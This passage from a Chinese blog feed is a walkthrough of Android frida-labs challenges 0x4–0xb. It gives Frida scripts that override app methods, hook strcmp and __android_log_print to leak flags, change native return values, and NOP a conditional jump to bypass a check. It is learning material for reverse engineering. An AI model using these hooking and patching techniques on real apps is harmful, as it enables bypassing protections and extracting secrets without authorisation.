class="line"><span class="string">        checker.code.value=512;</span></span><br><span class="line"><span class="string">        this.onClick(v);</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">process = device.attach(<span class="number">2977</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><h3 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h3><p>在其他方法里有一个get_flag函数，同0x2类似，hook掉onCreate即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>() &#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0x4.MainActivity&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 正确Hook onCreate方法</span></span><br><span class="line">    MainActivity.onCreate.<span class="built_in">overload</span>(<span class="string">&#x27;android.os.Bundle&#x27;</span>).implementation = <span class="built_in">function</span>(bundle) &#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">onCreate</span>(bundle);</span><br><span class="line">        console.<span class="built_in">log</span>(<span class="string">&quot;触发get_flag方法...&quot;</span>);</span><br><span class="line">        var checker = Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0x4.Check&quot;</span>)</span><br><span class="line">        var check = checker.$<span class="built_in">new</span>();</span><br><span class="line">        console.<span class="built_in">log</span>(check.<span class="built_in">get_flag</span>(<span class="number">1337</span>));</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这里记住get_flag不是静态方法，需要先<strong>实例化</strong>然后才能调用</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202503282033884.png" alt="image-20250327233612795" style="zoom: 50%;" /><h3 id="0x5"><a href="#0x5" class="headerlink" title="0x5"></a>0x5</h3><p>同上，直接hook onCreate调flag方法即可</p><h3 id="0x6"><a href="#0x6" class="headerlink" title="0x6"></a>0x6</h3><p>需要在传参的时候传入一个实例化的checker，并对其中的变量进行赋值，hook掉onCreate</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>() &#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0x6.MainActivity&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 正确Hook onCreate方法</span></span><br><span class="line">    MainActivity.onCreate.<span class="built_in">overload</span>(<span class="string">&#x27;android.os.Bundle&#x27;</span>).implementation = <span class="built_in">function</span>(bundle) &#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">onCreate</span>(bundle);</span><br><span class="line">        console.<span class="built_in">log</span>(<span class="string">&quot;触发get_flag方法...&quot;</span>);</span><br><span class="line">        var checker = Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0x6.Checker&quot;</span>)</span><br><span class="line">        var check = checker.$<span class="built_in">new</span>();</span><br><span class="line">        check.num1.value=<span class="number">1234</span>;</span><br><span class="line">        check.num2.value=<span class="number">4321</span>;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">get_flag</span>(check);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="0x7"><a href="#0x7" class="headerlink" title="0x7"></a>0x7</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>()&#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0x7.MainActivity&quot;</span>);</span><br><span class="line"></span><br><span class="line">    MainActivity.flag.implementation  = <span class="built_in">function</span>(v)&#123;</span><br><span class="line">        var check=Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);</span><br><span class="line">        var check_instance=check.$<span class="built_in">new</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        check_instance.num1.value=<span class="number">1000</span>;</span><br><span class="line">        check_instance.num2.value=<span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">flag</span>(check_instance);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>要求在checker存在变量的时候，实例化要进行参数的指定，不然会报错</p><h3 id="0x8"><a href="#0x8" class="headerlink" title="0x8"></a>0x8</h3><p>一些frida用法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">[V2185A::com.ad2001.frida0x8 ]-&gt; Module.<span class="built_in">enumerateExports</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>)</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x706e3cef88c0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Java_com_ad2001_frida0x8_MainActivity_cmpstr&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x706e3cef8aa0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;_ZN7_JNIEnv17GetStringUTFCharsEP8_jstringPh&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x706e3cef8ae0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;_ZN7_JNIEnv21ReleaseStringUTFCharsEP8_jstringPKc&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line">[V2185A::com.ad2001.frida0x8 ]-&gt; Module.<span class="built_in">enumerateExports</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>)[<span class="number">0</span>].address</span><br><span class="line"><span class="string">&quot;0x706e3cef88c0&quot;</span></span><br><span class="line">[V2185A::com.ad2001.frida0x8]-&gt; Module.<span class="built_in">getExportByName</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>,<span class="string">&quot;Java_com_ad2001_frida0x8_MainActivity_cmpstr&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="string">&quot;0x706e3cef88c0&quot;</span></span><br><span class="line">[V2185A::com.ad2001.frida0x8 ]-&gt; Module.<span class="built_in">findExportByName</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>,<span class="string">&quot;Java_com_ad2001_frida0x8_MainActivity_cmpstr</span></span><br><span class="line"><span class="string">&quot;</span>)</span><br><span class="line"><span class="string">&quot;0x706e3cef88c0&quot;</span></span><br><span class="line">[V2185A::com.ad2001.frida0x8 ]-&gt; Module.<span class="built_in">getBaseAddress</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>)</span><br><span class="line"><span class="string">&quot;0x706e3cef8000&quot;</span></span><br><span class="line">[V2185A::com.ad2001.frida0x8 ]-&gt; Module.<span class="built_in">enumerateImports</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>)</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x7070f74e9920&quot;</span>,</span><br><span class="line">        <span class="string">&quot;module&quot;</span>: <span class="string">&quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;__cxa_finalize&quot;</span>,</span><br><span class="line">        <span class="string">&quot;slot&quot;</span>: <span class="string">&quot;0x706e3cef9d90&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x7070f74e9660&quot;</span>,</span><br><span class="line">        <span class="string">&quot;module&quot;</span>: <span class="string">&quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;__cxa_atexit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;slot&quot;</span>: <span class="string">&quot;0x706e3cef9d98&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x7070f74e5300&quot;</span>,</span><br><span class="line">        <span class="string">&quot;module&quot;</span>: <span class="string">&quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;__register_atfork&quot;</span>,</span><br><span class="line">        <span class="string">&quot;slot&quot;</span>: <span class="string">&quot;0x706e3cef9da0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x7070f74a7970&quot;</span>,</span><br><span class="line">        <span class="string">&quot;module&quot;</span>: <span class="string">&quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;__strlen_chk&quot;</span>,</span><br><span class="line">        <span class="string">&quot;slot&quot;</span>: <span class="string">&quot;0x706e3cef9db0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x7070f7475040&quot;</span>,</span><br><span class="line">        <span class="string">&quot;module&quot;</span>: <span class="string">&quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;strcmp&quot;</span>,</span><br><span class="line">        <span class="string">&quot;slot&quot;</span>: <span class="string">&quot;0x706e3cef9db8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x7070fb675140&quot;</span>,</span><br><span class="line">        <span class="string">&quot;module&quot;</span>: <span class="string">&quot;/system/lib64/liblog.so&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;__android_log_print&quot;</span>,</span><br><span class="line">        <span class="string">&quot;slot&quot;</span>: <span class="string">&quot;0x706e3cef9dc0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x7070f74906b0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;module&quot;</span>: <span class="string">&quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;__stack_chk_fail&quot;</span>,</span><br><span class="line">        <span class="string">&quot;slot&quot;</span>: <span class="string">&quot;0x706e3cef9dd0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>因为这个lab使用的native层里的函数，因此按照之前的方式进行hook就会出现问题，因此引入一个api</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Interceptor.<span class="built_in">attach</span>(targetAddress, &#123;</span><br><span class="line">    onEnter: <span class="built_in">function</span> (args) &#123;</span><br><span class="line">        console.<span class="built_in">log</span>(<span class="string">&#x27;Entering &#x27;</span> + functionName);</span><br><span class="line">        <span class="comment">// Modify or log arguments if needed</span></span><br><span class="line">    &#125;,</span><br><span class="line">    onLeave: <span class="built_in">function</span> (retval) &#123;</span><br><span class="line">        console.<span class="built_in">log</span>(<span class="string">&#x27;Leaving &#x27;</span> + functionName);</span><br><span class="line">        <span class="comment">// Modify or log return value if needed</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li><code>Interceptor.attach</code>：为指定的函数地址附加一个回调。<code>targetAddress</code> 应该是我们想要 hook 的原生函数的地址。</li><li><code>onEnter</code>：当 被hook的函数 进入时调用该回调。它提供对函数参数 （<code>args）</code> 的访问 。</li><li><code>onLeave</code>：当 被hook的函数 即将退出时调用该回调。它提供对返回值 （<code>retval</code>） 的访问。</li></ul><p>而之前提到的都是能够获得addr的api，因此我们可以考虑hook掉strcmp来获取他的参数，因为在libfrida0x8.so中strcmp的参数有包括flag的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    var MainActivity = Java.use(&quot;com.ad2001.frida0x8.MainActivity$1&quot;);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    MainActivity.onClick.implementation = function(v)&#123;</span></span><br><span class="line"><span class="string">        var strcmp_addr=Module.findExportByName(&quot;libc.so&quot;,&quot;strcmp&quot;);</span></span><br><span class="line"><span class="string">        Interceptor.attach(strcmp_addr, &#123;</span></span><br><span class="line"><span class="string">        onEnter: function (args) &#123;</span></span><br><span class="line"><span class="string">        var string=Memory.readUtf8String(args[0])</span></span><br><span class="line"><span class="string">            if(string==&quot;abcd&quot;)</span></span><br><span class="line"><span class="string">                console.log(Memory.readUtf8String(args[1]));</span></span><br><span class="line"><span class="string">            // Modify or log arguments if needed</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">        onLeave: function (retval) &#123;</span></span><br><span class="line"><span class="string">            // Modify or log return value if needed</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">    this.onClick(v);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">process = device.attach(<span class="number">6861</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>记得在hook之后重新调用onClick（好玩！</p><h3 id="0x9"><a href="#0x9" class="headerlink" title="0x9"></a>0x9</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, <span class="function">sys</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line"><span class="function">    print(message)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">jscode =</span> <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Java.perform(function() &#123;</span></span><br><span class="line"><span class="string">    var MainActivity = Java.use(&quot;</span>com.ad2001.a0x9.MainActivity$<span class="number">1</span><span class="string">&quot;);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    MainActivity.onClick.implementation = function(v) &#123;</span></span><br><span class="line"><span class="string">        console.log(&quot;</span>[*] onClick 被调用<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        var check_flag = Module.findExportByName(&quot;</span>liba0x9.so<span class="string">&quot;, &quot;</span>Java_com_ad2001_a0x9_MainActivity_check_1flag<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        Interceptor.attach(check_flag, &#123;</span></span><br><span class="line"><span class="string">            onEnter: function(args) &#123;</span></span><br><span class="line"><span class="string">                console.log(&quot;</span>[*] check_flag 被调用<span class="string">&quot;);</span></span><br><span class="line"><span class="string">            &#125;,</span></span><br><span class="line"><span class="string">            onLeave: function(retval) &#123;</span></span><br><span class="line"><span class="string">                retval.replace(1337); // 修改返回值为 1337</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">        this.onClick(v);</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">device = frida.<span class="built_in">get_usb_device</span>(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">process = device.<span class="built_in">attach</span>(<span class="number">7244</span>)</span><br><span class="line">script = process.<span class="built_in">create_script</span>(jscode)</span><br><span class="line">script.<span class="built_in">on</span>(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.<span class="built_in">load</span>()</span><br><span class="line"></span><br><span class="line">sys.stdin.<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure><p>替换返回值即可</p><h3 id="0xa"><a href="#0xa" class="headerlink" title="0xa"></a>0xa</h3><p>这里我选择的是直接hook掉android_log_print函数，因为在get_flag中该函数的参数包含一个flag的指针，如此便可以获得flag的值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>() &#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0xa.MainActivity&quot;</span>);</span><br><span class="line">    MainActivity.onCreate.<span class="built_in">overload</span>(<span class="string">&#x27;android.os.Bundle&#x27;</span>).implementation = <span class="built_in">function</span>(bundle) &#123;</span><br><span class="line">        <span class="keyword">this</span>.onCreate.<span class="built_in">call</span>(<span class="keyword">this</span>, bundle);</span><br><span class="line">        </span><br><span class="line">        var get_flag = <span class="keyword">new</span> <span class="built_in">NativeFunction</span>(</span><br><span class="line">            Module.<span class="built_in">findExportByName</span>(<span class="string">&quot;libfrida0xa.so&quot;</span>, <span class="string">&quot;_Z8get_flagii&quot;</span>),</span><br><span class="line">            <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]</span><br><span class="line">        );</span><br><span class="line">        <span class="built_in">get_flag</span>(<span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    Interceptor.<span class="built_in">attach</span>(Module.<span class="built_in">findExportByName</span>(<span class="string">&quot;liblog.so&quot;</span>, <span class="string">&quot;__android_log_print&quot;</span>), &#123;</span><br><span class="line">        onEnter: <span class="built_in">function</span>(args) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Memory.<span class="built_in">readUtf8String</span>(args[<span class="number">1</span>]).<span class="built_in">includes</span>(<span class="string">&quot;FLAG&quot;</span>)) &#123;</span><br><span class="line">                console.<span class="built_in">log</span>(<span class="string">&quot;[FLAG] &quot;</span> + Memory.<span class="built_in">readUtf8String</span>(args[<span class="number">3</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="0xb"><a href="#0xb" class="headerlink" title="0xb"></a>0xb</h3><p>这里发现在getflag函数中，其中的逻辑导致无法对函数体进行合理的利用，因此考虑直接对jnz进行一个nop，也或者可以直接hook跳到正确的函数体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>() &#123;</span><br><span class="line">    Interceptor.<span class="built_in">attach</span>(Module.<span class="built_in">findExportByName</span>(<span class="string">&quot;liblog.so&quot;</span>, <span class="string">&quot;__android_log_print&quot;</span>), &#123;</span><br><span class="line">        onEnter: <span class="built_in">function</span>(args) &#123;</span><br><span class="line">            var tag = Memory.<span class="built_in">readUtf8String</span>(args[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">if</span> (tag.<span class="built_in">includes</span>(<span class="string">&quot;FLAG&quot;</span>)) &#123;</span><br><span class="line">                console.<span class="built_in">log</span>(<span class="string">&quot;[FLAG] &quot;</span> + Memory.<span class="built_in">readUtf8String</span>(args[<span class="number">3</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Java.<span class="built_in">choose</span>(<span class="string">&quot;com.ad2001.frida0xb.MainActivity&quot;</span>, &#123;</span><br><span class="line">        onMatch: <span class="built_in">function</span>(obj) &#123;</span><br><span class="line">            Interceptor.<span class="built_in">attach</span>(Module.<span class="built_in">getExportByName</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>, <span class="string">&quot;Java_com_ad2001_frida0xb_MainActivity_getFlag&quot;</span>), &#123;</span><br><span class="line">                onEnter: <span class="built_in">function</span>(args) &#123;</span><br><span class="line"></span><br><span class="line">                    Memory.<span class="built_in">protect</span>(Module.<span class="built_in">findBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>).<span class="built_in">add</span>(<span class="number">0x170ce</span>), <span class="number">4</span>, <span class="string">&#x27;rwx&#x27;</span>);</span><br><span class="line">                    <span class="keyword">new</span> <span class="built_in">X86Writer</span>(Module.<span class="built_in">findBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>).<span class="built_in">add</span>(<span class="number">0x170ce</span>)).<span class="built_in">putNop</span>().<span class="built_in">flush</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            obj.<span class="built_in">getFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这样就可以了</p><blockquote><p>PS：最后发现无需hook掉日志输出函数，其实一开始就应该明白的，毕竟机器都root了，怎么还看不了日志（，adb中就有logcat，可恶!!</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Android运行机制&quot;&gt;&lt;a href=&quot;#Android运行机制&quot; class=&quot;headerlink&quot; title=&quot;Android运行机制&quot;&gt;&lt;/a&gt;Android运行机制&lt;/h2&gt;&lt;p&gt;一般而言，在启动一个 App 时，Android 会首先执行 App</summary>
      
    
    
    
    <category term="安卓逆向" scheme="http://s1nec-1o.github.io/categories/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"/>
    
    
    <category term="android" scheme="http://s1nec-1o.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>固件下的hook &amp; patch</title>
